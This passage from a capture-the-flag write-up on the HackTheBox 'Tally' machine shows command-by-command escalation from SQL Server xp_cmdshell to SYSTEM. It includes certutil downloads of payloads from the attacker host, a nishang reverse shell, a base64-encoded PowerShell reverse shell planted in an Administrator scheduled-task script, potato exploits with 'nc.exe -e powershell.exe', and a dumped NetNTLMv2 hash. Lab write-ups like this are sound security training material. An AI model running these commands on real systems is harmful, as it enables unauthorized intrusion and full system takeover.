SQL (sa  dbo@master)> xp_cmdshell whoami
output        
-----------   
tally\sarah   

NULL  
```

Using this command execution, I can open a shell as `sarah`.
I brought a payload from nishang's.

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ python -m http.server                                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.59 - - [06/Mar/2025 12:30:30] "GET /rshell_9000.ps1 HTTP/1.1" 200 -
```

```sql
SQL (sa  dbo@master)> xp_cmdshell certutil -urlcache -split -f http://10.10.14.4:8000/rshell_9000.ps1 C:\Users\Sara\Documents\rshell_9000.ps1
output                                                
---------------------------------------------------   
****  Online  ****                                    

CertUtil: -URLCache command completed successfully.



SQL (sa  dbo@master)> xp_cmdshell dir C:\Users\Sarah\Documents
output                                                             
----------------------------------------------------------------   
 Volume in drive C has no label.                                   

 Volume Serial Number is 8EB3-6DCB                                 

 Directory of C:\Users\Sarah\Documents                             

06/03/2025  19:31    <DIR>          .                              
06/03/2025  19:31    <DIR>          ..                             
06/03/2025  19:31             4,402 rshell_9000.ps1                
13/10/2017  20:38    <DIR>          SQL Server Management Studio  
13/10/2017  20:38    <DIR>          Visual Studio 2015             
               1 File(s)          4,402 bytes                      
               4 Dir(s)   2,893,979,648 bytes free  



SQL (sa  dbo@master)> xp_cmdshell powershell C:\Users\Sarah\Documents\rshell_9000.ps1
```

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.59] 52589
Windows PowerShell running as user Sarah on TALLY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
tally\sarah
```

I got `Sarah`'s shell!

### Exploit Firefox CVE-2016-1960

> 이건 나중에 다시 해보자...



# Shell as `SYSTEM`

### Enumeration

Let's visit `Sarah`'s home directory.

```powershell
PS C:\Users\Sarah\Desktop> dir

    Directory: C:\Users\Sarah\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       01/10/2017     22:32            916 browser.bat
-a----       17/09/2017     21:50            845 FTP.lnk
-a----       23/09/2017     21:11            297 note to tim (draft).txt
-a----       19/10/2017     21:49          17152 SPBestWarmUp.ps1
-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml
-a----       17/09/2017     21:48           1914 SQLCMD.lnk
-a----       21/09/2017     00:46            129 todo.txt
-ar---       06/03/2025     10:15             34 user.txt
-a----       17/09/2017     21:49            936 zz_Migration.lnk   
```

There's a note "note to time (draft).txt".

```powershell
PS C:\Users\Sarah\Desktop> cat "note to tim (draft).txt"
Hi Tim,

As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I've gone ahead and disallowed any cmd.exe outside the Windows folder from executing.

Thanks,
Sarah
```

Let's now run `winPEAS`.

```ruby
???????????? Current Token privileges
? Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation         
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED



???????????? Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    Sarah::TALLY:1122334455667788:95df69f5d3730642db6e97dc2f7819f8:0101000000000000e528d7d2d28edb01a419139b07448b0100000000080030003000000000000000000000000030000081aa061403c049fc9aacc2a8969a497043a2e0eb3c46e7ffceb4fefec6a2a2b20a00100000000000000000000000000000000000090000000000000000000000          



???????????? Looking for Firefox DBs
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                       
    Firefox credentials file exists at C:\Users\Sarah\AppData\Roaming\Mozilla\Firefox\Profiles\1esm8044.default\key3.db                                                                   
? Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

### SPBestWarmUp scheduled job (Takes long)

There are files named as `SPBestWarmUp`.
I googled github and found a [repository](https://github.com/ptimothyp/spbestwarmup) have the same name.

The `SPBestWarmUp.xml` looks like a scheduled task.

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2017-01-25T01:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
...[snip]...
```

It seems that it's run as `Administrator`.

```xml
...[snip]...
  <Principals>
    <Principal id="Author">
      <UserId>TALLY\Administrator</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals> 
...[snip]...
```

It eventually runs `SPBestWarmUp.ps1`.

```xml
...[snip]...
  <Actions Context="Author">
    <Exec>
      <Command>PowerShell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments
      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
    </Exec>
  </Actions> 
...[snip]...
```

Lastly, it seems that we have full ACL to `SPBestWarmUp.ps1` file.

```powershell
PS C:\Users\Sarah\Desktop> icacls SPBestWarmUp.ps1
SPBestWarmUp.ps1 NT AUTHORITY\SYSTEM:(F)
                 BUILTIN\Administrators:(F)
                 TALLY\Sarah:(F)
```

Given that, we can run powershell command by editing the `SPBestWarmUp.ps1` file while it takes quite long.

```powershell
PS C:\users\sarah\desktop> copy SPBestWarmUp.ps1 SPBestWarmUp.ps1.bak
PS C:\users\sarah\Desktop> echo "powershell -e JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMTAuMTQuNCIsOTAwMSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlJXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk=" > SPBestWarmUp.ps1
```

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.59 52566
PS C:\Users\Sarah\Desktop> whoami
tally\administrator
PS C:\Users\Sarah\Desktop>
```

I got `Administrator`'s shell!

### SeImpersonatePrivilege

Based on `winPEAS` result, `SeImpersonate` privilege is enabled on the system.

```powershell
PS C:\Users\Sarah\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Using `GodPotato` or `PrintSpoofer`, etc, I can escalate privileges with this

##### GodPotato(Failed)

Before using `GodPotato`, I uploaded `nc.exe` first.

```powershell
PS C:\Users\Sarah\Documents> certutil.exe -urlcache -split -f http://10.10.14.4:8000/nc.exe
****  Online  ****
  0000  ...
  e800
CertUtil: -URLCache command completed successfully.
```

Then, let's check its `.Net` framework version.

```powershell
PS C:\Users\Sarah\Documents> reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Version

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
    Version    REG_SZ    4.6.01586
```

Then, download `GodPotato-Net4.exe` from public [releases](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe).

```powershell
PS C:\Users\Sarah\Documents> certutil.exe -urlcache -split -f http://10.10.14.4:8000/GodPotato-NET4.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
```

However, it was not working with security context issue.

```yaml
PS C:\Users\Sarah\Documents> .\GodPotato-Net4.exe -cmd "C:\Users\Sarah\Documents\nc.exe 10.10.14.4 9001 -e cmd.exe"
[*] CombaseModule: 0x140708324638720
[*] DispatchTable: 0x140708326615520
[*] UseProtseqFunction: 0x140708326145840
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\30da6b9b-d755-453f-8af0-80edece004b5\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00007c02-2c30-ffff-bee0-c956586fc1a3
[*] DCOM obj OXID: 0x31745a0c1e6a26e8
[*] DCOM obj OID: 0xd4f9c4da9d1b96c5
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token
```

##### SweetPotato

Let's upload it first.

```bash
PS C:\Users\Sarah\Documents> certutil.exe -urlcache -split -f http://10.10.14.4:8000/SweetPotato.exe
****  Online  ****
  000000  ...
  0bf000
CertUtil: -URLCache command completed successfully.
```

I ran `whoami` for test, and it showed that the command was run by `SYSTEM`.

```powershell
PS C:\Users\Sarah\Documents> .\SweetPotato.exe -a whoami
Modifying SweetPotato by Uknow to support webshell
Github: https://github.com/uknowsec/SweetPotato 
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
[+] Triggering notification on evil PIPE \\TALLY/pipe/218bc1d1-b5e3-4b0d-b9e5-8e9d2776f25f
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] CreatePipe success
[+] Command : "c:\Windows\System32\cmd.exe" /c whoami 
[+] process with pid: 7848 created.

=====================================

nt authority\system
```

Then, using `nc.exe` I opened a reverse shell. For the payload I used `powershell.exe` instead of `cmd.exe` since I saw a comment that `cmd.exe` is restricted.

```powershell
PS C:\Users\Sarah\Documents> .\SweetPotato.exe -a "C:\Users\Sarah\Documents\nc.exe 10.10.14.4 9001 -e powershell.exe"
```

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.59] 52916
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

I got `SYSTEM`'s shell.